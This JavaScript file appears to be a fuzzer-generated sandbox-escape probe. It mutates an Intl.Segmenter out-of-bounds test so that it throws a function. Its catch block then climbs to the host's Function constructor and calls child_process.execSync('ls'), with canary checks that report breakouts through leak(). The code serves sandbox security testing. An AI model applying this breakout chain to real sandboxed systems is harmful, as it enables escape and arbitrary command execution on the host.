try {
    const input = 'a b c';
    const granularities = [
        undefined,
        'grapheme',
        'word',
        'sentence'
    ];
    const index_to_out_of_bound = [
        input.length,
        input.length + 0.1,
        -1,
        -2,
        '-1',
        '-2',
        '-1.1',
        Infinity,
        -Infinity,
        'Infinity',
        '-Infinity'
    ];
    granularities.forEach(function (granularity) {
        let REPLACER = 23;
        const segmenter = new Intl.Segmenter(undefined, { granularity });
        const segment = segmenter.segment(input);
        index_to_out_of_bound.forEach(function (index) {
            throw () => {
                return () => {
                };
            };
            const result = segment.containing(index);
            assert.sameValue(undefined, result);
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}